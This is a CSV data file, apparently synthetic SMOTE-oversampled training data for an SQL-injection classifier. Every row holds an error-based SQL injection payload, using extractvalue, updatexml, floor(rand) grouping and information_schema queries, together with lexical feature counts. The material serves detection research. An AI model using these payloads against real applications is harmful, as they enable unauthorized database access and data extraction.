id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000383,attack,error,"1   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   8475  =  8475",nearest_attack_euclidean,R000528,0.5119888991178412,204.75133246805856,28.553666604861327,3.3979236739141756,46.0,40.0,93.64399925833592,25.107333209722654,0.22492454847521604,0.1955865638914922,0.4568889246077677,0.12259996302552402,0.0,0.0,0.0,0.0,1.0,2.0,0.0,17.107333209722654,0.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000384,attack,error,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000417,0.20114535484691706,329.13324186312195,29.0,3.138104448512207,72.0,40.62664837262439,158.87994511787315,57.62664837262439,0.21876824815909424,0.12343111314431703,0.4827159114035967,0.17508472729299207,0.0,0.0,0.0,0.0,0.0,1.0,0.0,34.0,0.0,0.0,0.6266483726243859,21.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000385,attack,error,"-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000682,0.03955821896602618,206.4557172513107,38.0,3.855445436554438,63.0,37.0,83.37976437609225,23.07595287521845,0.30518593153040496,0.17923618200992036,0.4038123926609115,0.11176549379876313,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.07595287521845,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000386,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000630,0.46608818019867165,322.68902176008777,38.68902176008777,3.9889153728709057,111.75608704035108,55.0,119.62195647982446,36.31097823991223,0.34631998783861967,0.1704430879294961,0.3707084048375368,0.11252851939434735,4.0,0.0,0.0,0.0,2.0,1.3109782399122327,0.0,22.0,0.0,0.0,6.0,4.310978239912233,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000387,attack,error,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000240,0.19920407753921818,212.88362828962852,30.59748127532746,3.920062063000857,72.79244382598239,45.0,73.79244382598239,21.29874063766373,0.3418441129157872,0.21154439258085947,0.3465450994175841,0.10006639508576924,0.0,0.0,2.0,0.0,0.0,2.0,0.0,12.29874063766373,0.0,0.0,5.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000388,attack,error,"1'+  (  select 'sqje' where 1634  =  1634 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000655,0.8509155602959453,215.6892503640833,34.0,3.69849468955722,58.31074963591671,40.0,88.0,29.37850072816659,0.27035196813611495,0.1854528420636664,0.4079962525400661,0.13619893726015256,3.378500728166588,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.3107496359167057,0.6892503640832942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000389,attack,error,1%' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',nearest_attack_euclidean,R000404,1.7152311371656792,348.0,31.021771911582935,3.3944661413360167,82.76826892072036,45.0,157.23173107927965,63.0,0.2378398532204608,0.12931034482758622,0.4518153191933323,0.1810344827586207,4.0,0.0,0.0,0.0,0.0,3.0,0.0,31.318818725611376,2.0,1.021771911582934,0.0,23.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3405906371943112,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.6594093628056887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000390,attack,error,"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000476,0.21055525161071736,203.2962620170796,38.459252403415924,3.8738460173039964,63.0,37.0,80.83700961366368,22.459252403415924,0.3099390304043855,0.1820276845232105,0.3975712271892265,0.11046205788317753,1.0,0.0,1.0,0.0,1.0,1.0,0.0,14.459252403415922,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000391,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000208,0.6901452397826051,139.46682495134218,27.69336499026844,3.557025337863648,56.0,11.693364990268439,58.38672998053688,13.38672998053688,0.4016404778225301,0.08381114748705379,0.4186475936131889,0.09590078107722722,0.6933649902684393,0.0,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,0.6933649902684391,2.0000000000000004,0.6933649902684392,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000392,attack,error,"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",nearest_attack_euclidean,R000136,0.37046631499748184,288.71706247087633,36.571653713854836,3.863726245742376,99.57165371385484,41.857743236946234,113.85879390160214,33.42887161847312,0.34546123434693465,0.14482044026330118,0.39391711133140767,0.11580121405835651,0.0,0.0,0.0,0.0,2.0,1.8572179046182793,0.0,21.571653713854836,0.0,2.0,5.0,3.8572179046182793,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8572179046182793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.85721790461828
SMOTE_000393,attack,error,"1   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  3977  =  3977",nearest_attack_euclidean,R000600,0.5967861777290969,217.13668262992383,28.0,3.294738089539473,46.805467305196956,40.0,103.10934610393906,27.221869220787813,0.21595073988538216,0.18462826850512293,0.474131106088458,0.12528988552103687,0.0,0.0,0.0,0.0,1.0,2.0,0.0,19.221869220787813,0.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.8054673051969532,0.19453269480304688,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000394,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000421,0.1492884879527588,322.5626621402642,40.0,4.016041689794039,106.42199660519816,63.0,118.14066553506605,35.0,0.32986303121508853,0.19534043567121345,0.36627406885191277,0.10852246426178525,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000395,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000668,0.11613126113447365,241.55017163581397,31.144982836418603,3.70856431697692,77.0,37.0,98.84013730865118,28.710034327162795,0.31884414744241907,0.15321082409570785,0.4091053569017616,0.1188396715601115,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.710034327162795,0.0,0.0,5.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000396,attack,error,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000297,1.0856938197769468,184.42248251884607,30.577517481153926,3.859925673965205,50.3100699246157,44.6899300753843,66.0,23.422482518846074,0.27282854803611317,0.24229672107991568,0.3578765027542937,0.12699822812967737,2.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.422482518846074,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.5775174811539254,0.4224825188460745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000397,attack,error,"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",nearest_attack_euclidean,R000555,0.21197575116627762,275.71799470711596,37.27179947071159,4.025389104682269,107.0,35.0,99.17439576569276,34.54359894142319,0.38817709996684646,0.12697381774616473,0.3595822435890172,0.12526683869797162,0.0,4.0,0.0,0.0,2.0,2.0,0.0,18.54359894142319,0.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000398,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000684,0.28991302088988014,142.54671902080656,25.290656195838686,3.6354450698405008,34.87196858751606,37.83737521664526,52.41868760832263,17.418687608322628,0.24485286919938493,0.2653007588621833,0.3677215681202893,0.1221248038181425,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.709343804161314,0.0,0.0,5.709343804161315,1.0000000000000004,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000399,attack,error,"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",nearest_attack_euclidean,R000632,0.3045093110654574,331.4000959483933,38.0,3.926868785717514,109.0,55.0,129.05722509862278,38.34287084977046,0.329039018981303,0.16602886278873086,0.38924333473825196,0.11568878349171417,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.342870849770463,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000400,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000673,0.054834786613997016,160.0,27.057982079988356,3.822135223151463,44.17394623996506,38.76807168004658,55.115964159976706,21.942017920011644,0.27608716399978167,0.24230044800029113,0.34447477599985443,0.1371376120000728,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.942017920011645,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000401,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000749,1.2892362211528428,215.47082190645867,34.0,3.6994108220542152,58.52917809354135,40.0,88.0,28.941643812917317,0.2716407148499209,0.18564098027006143,0.40841015659413515,0.13430814828588244,2.941643812917315,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.5291780935413426,0.47082190645865746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000402,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000359,0.5491730706032873,135.74193860210153,26.741938602101502,3.706844253752673,31.0,39.0,47.0,18.7419386021015,0.2283769010530966,0.2873128755184118,0.34624884998372707,0.13806137344476446,0.7419386021015013,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,7.0,1.0000000000000004,0.7419386021015013,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",nearest_attack_euclidean,R000302,0.1291577724015319,299.76028281556245,35.17602828155625,3.855062770229274,108.0,35.0,118.40822625244996,38.35205656311249,0.36034482541531476,0.11677841564385202,0.3949457240238961,0.12793103491693705,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.352056563112495,0.0,2.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000404,attack,error,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000240,0.31663525604178805,211.7738143593895,30.396259194198496,3.9167031207239007,71.792518388397,45.0,73.58503677679398,21.3962591941985,0.3390616917757087,0.2127143406246614,0.34723440924638865,0.10098955835324125,0.1320863980661655,0.0,2.0,0.0,0.0,2.0,0.0,12.264172796132332,0.0,0.0,5.0,4.0,0.13208639806616557,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000405,attack,error,"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000207,0.4717395698543538,285.52365874402597,36.0,3.8733763581076515,100.0,35.0,111.603048953355,38.920609790670994,0.35074159330399457,0.1227595576563981,0.39022978712595346,0.1362690619136538,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.920609790670998,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000406,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",nearest_attack_euclidean,R000304,0.6923499584121154,243.54247348612682,33.0,3.7479356643976853,79.16989394450725,37.0,98.91505302774638,28.457526513873187,0.32506094869600444,0.1519248546349138,0.4061612112448507,0.11685298542423105,0.0,4.0,0.0,0.0,0.0,1.457526513873188,0.0,18.0,0.0,0.0,5.0,1.457526513873188,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000407,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",nearest_attack_euclidean,R000504,0.02331979673904612,161.0,30.0,3.8809621959872556,48.0,35.0,57.0,21.0,0.2981366459627329,0.21739130434782608,0.35403726708074534,0.13043478260869565,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000408,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000519,0.20350146742369957,164.0,27.0,3.6187825488045724,38.340170088361496,35.879773215518014,64.56011339224099,25.219943303879504,0.23378152492903348,0.2187791049726708,0.39365922800146946,0.15378014209682622,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.219943303879504,2.0000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000409,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000150,0.048439933465889116,283.41435490012765,35.058564509987235,3.9573582709797255,108.0,35.0,104.53148392010213,35.88287098002554,0.3810945007554515,0.12350284746704446,0.3687986297007762,0.12660402207672786,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.882870980025533,0.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
